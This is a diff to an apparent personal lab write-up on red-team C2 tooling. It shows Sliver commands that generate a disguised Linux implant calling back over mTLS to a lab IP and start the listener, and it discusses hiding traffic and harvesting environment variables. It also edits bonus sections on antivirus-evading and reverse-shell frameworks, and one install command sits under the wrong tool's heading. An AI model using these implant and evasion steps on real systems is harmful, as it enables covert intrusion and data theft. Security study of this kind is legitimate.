@@ -337,7 +337,7 @@ Now we just let the listener catch the incoming connection:
 
 <img width="1516" height="517" alt="2026-05-01-19:15:50" src="https://github.com/user-attachments/assets/36985793-bd21-4d7c-ba66-c31fa157b1d2" />
 
-It looks a bit more legit now. Take a look at the GET URL:
+It looks a bit more legit now. Take a look at the `GET URL`:
 
 <img width="1374" height="592" alt="2026-05-01-19:20:17" src="https://github.com/user-attachments/assets/01b40b71-5b8f-4769-91f8-5205589cecd3" />
 
@@ -349,8 +349,8 @@ Another one:
 <img width="1377" height="209" alt="2026-05-01-19:22:14" src="https://github.com/user-attachments/assets/4192aa22-9743-455c-8aea-35e183f1d02d" />
 
 
-
-There's something else we can do to obfuscate the connection even more: use `Wireguard` or `mTLS`. I'm going to start with mTLS A.K.A Mutual TLS.
+### Hide
+There's something else we can do to obfuscate the connection even more: use `Wireguard` or `mTLS`. I'm going to start with [mTLS](<https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/>) A.K.A Mutual TLS.
 
 
 ```console
@@ -363,11 +363,11 @@ sliver > generate -m 192.168.130.233 -o linux -C wordpress
 
 ```
 **New flag**
-`-m`: mtls string
+`-m`: The mtls string
 
 I renamed the payload to `mtls` in my own directory as we're starting to rack up payloads so I need a way to identify them.
 
-This time we don't start an http listener, but rather one that can handle the mTLS connection like so:
+This time we don't start an http listener, but rather one that can handle the **mTLS connection** like so:
 ```console
 sliver > mtls
 [*] Starting mTLS listener ...
@@ -402,6 +402,12 @@ Well the traffic is encrypted, so it's much harder to say:
 <img width="1389" height="840" alt="2026-05-01-19:52:20" src="https://github.com/user-attachments/assets/bcd74389-d7d0-4699-80b5-5bd7a66773e9" />
 
 
+**Help received**
+- [Sliver Docs](<https://sliver.sh/docs/>)
+
+
+
+
 
 
 ----------------
@@ -418,8 +424,9 @@ Well the traffic is encrypted, so it's much harder to say:
 - Show examples of some of it's features
 
 ## Multitalent
+Well, for example in the session we can easily aquire a lot of environment variables like so:
 
-<img width="693" height="519" alt="WIP" src="https://github.com/user-attachments/assets/8a770c06-cc74-4ea6-a679-01db820bf244" />
+<img width="1722" height="734" alt="2026-05-01-20:05:34" src="https://github.com/user-attachments/assets/a9ee3684-1a46-4882-8448-839389264b95" />
 
 
 
@@ -433,30 +440,6 @@ Well the traffic is encrypted, so it's much harder to say:
 
 
 
-# I) Bonus: Veil
-**Objective**
-- Try out Veil
-
-## About
-Veil is designed to generate Metasploit payloads that bypass common anti-virus solutions.
-
-Install it on Kali:
-```bash
-$ sudo apt update && sudo apt install veil -y
-```
-
-
-
-
-
-
----------
-
-
-
-
-
-
 # J) Bonus: ScareCrow
 **Objective**
 - Try out ScareCrow
@@ -464,18 +447,22 @@ $ sudo apt update && sudo apt install veil -y
 ## About
 ScareCrow is a payload creation framework for side loading into a legitimate Window process.
 
+Install it on Kali:
+```bash
+$ sudo apt update && sudo apt install veil -y
+```
+<img width="693" height="519" alt="WIP" src="https://github.com/user-attachments/assets/8a770c06-cc74-4ea6-a679-01db820bf244" />
 
 
 
---------
+
+# It works on my machine:
+<img width="1136" height="482" alt="2026-05-01-20:17:21" src="https://github.com/user-attachments/assets/1eb8550c-4c3c-42bd-b768-7f098b1550b3" />
+
+<img width="1126" height="248" alt="2026-05-01-20:21:15" src="https://github.com/user-attachments/assets/ce793955-d586-41be-83ca-a0a22b3b1962" />
+
+<img width="1402" height="450" alt="2026-05-01-20:22:09" src="https://github.com/user-attachments/assets/6065a90c-2acd-4d01-808a-368d96b5d573" />
 
 
 
-# K) Bonus: PoshC2
-**Objective**
-- Create malware that spins up a reverse shell using PoshC2
 
-
-# L) Bonus: Mythic
-**Objective**
-- Create malware that spins up a reverse shell using Mythic
